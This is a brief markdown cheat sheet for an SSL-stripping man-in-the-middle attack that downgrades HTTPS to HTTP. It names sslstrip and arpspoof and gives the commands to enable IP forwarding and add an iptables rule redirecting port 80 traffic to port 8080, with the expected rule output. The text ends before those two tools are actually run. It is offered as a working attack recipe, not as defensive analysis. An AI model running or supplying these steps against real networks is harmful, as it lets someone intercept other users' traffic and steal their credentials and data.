## ssl striping https to http (mitm)
*tools needed* 
1. sslstrip
2. arpspoof

### steps
1. `echo 1 > /proc/sys/net/ipv4/ip_forward`  its either 0 or 1.  we need it to be 1.  
2. `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`  
3. verify -- `iptables -t nat -L PREROUTING`  
before
```
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination 
```
after
```
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 8080
```

